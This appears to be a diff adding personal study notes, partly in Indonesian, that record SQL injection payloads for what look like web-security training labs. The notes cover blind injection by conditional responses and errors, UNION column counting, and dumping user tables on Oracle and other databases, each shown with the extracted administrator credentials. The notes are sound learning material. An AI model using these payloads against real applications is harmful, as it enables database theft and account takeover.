@@ -1,0 +1,204 @@
+
+
+
+Syntax
+
+
+// Blind SQL injection with conditional responses //
+
+
+' AND '1'='1
+' and (select 'a' from users where username='administrator')='a
+' and (select 'a' from users where username='administrator' and length(password)>=1)='a
+' and (select substring(password,1,1) from users where username='administrator')='a
+
+
+
+
+// SQL injection attack, listing the database contents on non-Oracle databases //
+
+check column
+' +union+select+null,null--
+' +union+select+table_name,+null+from+information_schema.tables--   | users_oaibkc |
+' +union+select+column_name,+null+from+information_schema.columns+where+table_name='users_oaibkc'--   | username_pyycky | password_dkjsei
+' +union+select+username_pyycky,+password_dkjsei+from+users_oaibkc--    | administrator | 7ltaun48ohmm3hh8yx4e
+
+
+
+// SQL injection attack, listing the database contents on Oracle //
+
+check column
+' +order+by+1--
+' +order+by+2--
+
+' +union+select+'a',+'a'+from+dual--
+' +union+select+table_name,+null+from+all_tables--	| dump semua tables |  USERS_XMKKUI
+' +union+select+column_name,+null+from+all_tab_columns+where+table_name='USERS_XMKKUI'--    | USERNAME_TLWIBI | PASSWORD_ENSQOT
+' +union+select+USERNAME_TLWIBI,+PASSWORD_ENSQOT+from+USERS_XMKKUI--    | administrator | i9llwogjq9w3hbd1z249
+
+
+
+// SQL injection UNION attack, determining the number of columns returned by the query //
+
+check column
+' +union+select+null,+null,+null--   | jadi chalengge yang satu ini cuman nyari tau berapa jumlah columns yang ada, dan hasil nya ada 3 columns, karna dari pertama nyoba, null nya 1 dan 2 selalu internal server error, dan berhasil response nya 200 di yang ke 3
+
+
+
+
+// SQL injection UNION attack, finding a column containing text //
+
+check columns 
+
+' +order+by+1--
+' +order+by+2--
+' +order+by+3--
+
+setelah cari tau kolom nya ada 3, cari tau di kolom ke berapa yang ada strings
+
+' +union+select+null,null,null--
+' +union+select+null,'a',null--
+' +union+select+null,'mnhfmb',null--
+
+
+
+
+
+
+
+
+
+
+
+
+
+// SQL injection UNION attack, retrieving data from other tables //
+
+check columns
+
+' +order+by+1--
+' +order+by+2--
+
+ada 2 columns 
+
+' +union+select+null,null--
+' +union+select+'a','a'--
+
+ternyata kedua kolom nya data type strings
+
+' +union+select+username,+password+from+users--       | administrator | pqj3gcjfloflyq77iwye
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// SQL injection UNION attack, retrieving multiple values in a single column //
+
+check columns
+
+' +union+select+null--       | awal nya gini dan error,   
+' +union+select+null,null--      | terus null nya di tambahin dan gak error, berarti kita tau kolom nya ada 2 
+
+tapi barusan aku coba pakai order by juga sama aja, kayaknya emang paling enak cek kolom itu pakai order by aja 
+
+' +order+by+1--
+' +order+by+2--
+
+
+pas sampai oder by ke 3 baru error berarti kolom nya hanya ada 2 
+
+' +union+select+null,null--
+' +union+select+'a',null--        | waktu coba di column pertama pakai string untuk data type nya, ternyata error 
+' +union+select+null,'a'--    | dan waktu di kolom kedua ternyata bisa untuk data type nya string 
+
+
+jadi berbeda sama sebelumnya..   karna sebelumnya kedua kolom bisa data type nya string,  jadi bisa satu kita pakai buat dump username dan satu kita pakai buat dump password,  
+di kasus kali ini cuman satu kolom yang data type nya string,   jadi script yang kita rancang juga harus ngikutin,     
+
+' +union+select+null,username||'~'||password+from+users--	| administrator~j0uwqmt2krv4meb17d2u
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// blind sqli with conditional errors
+'     > untuk cek apakah ada internal server error yang mengindikasikan adanya kerentanan blind sqli
+''    > dan kalua udah di close single quote nya pakai ' satu lagi..   dan dia beri respon 200 ok, maka bisa di validasi kalua itu ada kerentenan blind sqli
+
+sekarang masuk ke tahap untuk membuktikan parameter tersebut bener bener vulnerable terhadap blind sqli
+
+
+' || (select '') || '     > ini wll formatted sql query seharusnya kalau ini database nya menggunakan MySQL dia bakalan berikan respon 200 ok (jangan lupa url encode sebelum eksekusi)
+' || (select '' from dual) || '       > ini kalau dia pakai oracle database maka response nya akan 200 ok 
+
+
+dan untuk indikasi nya apakah ini bener bener rentan terhadap kerentanan sql injection,   coba untuk memasukkan nama tables yang gak ada (random)
+' || (select '' from dualnajbfuahfjhahyu) || '             >  jangan lupa untuk url encode semua nya    > kalau munculin error maka terindikasi bahwa rentan terhadap sql injection 
+
+
+' || (select '' from users) || '                  > kalau misalnya table users ada dalam database, response nya 200 ok   kalau gak ada, bakalan munculin error lagi 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
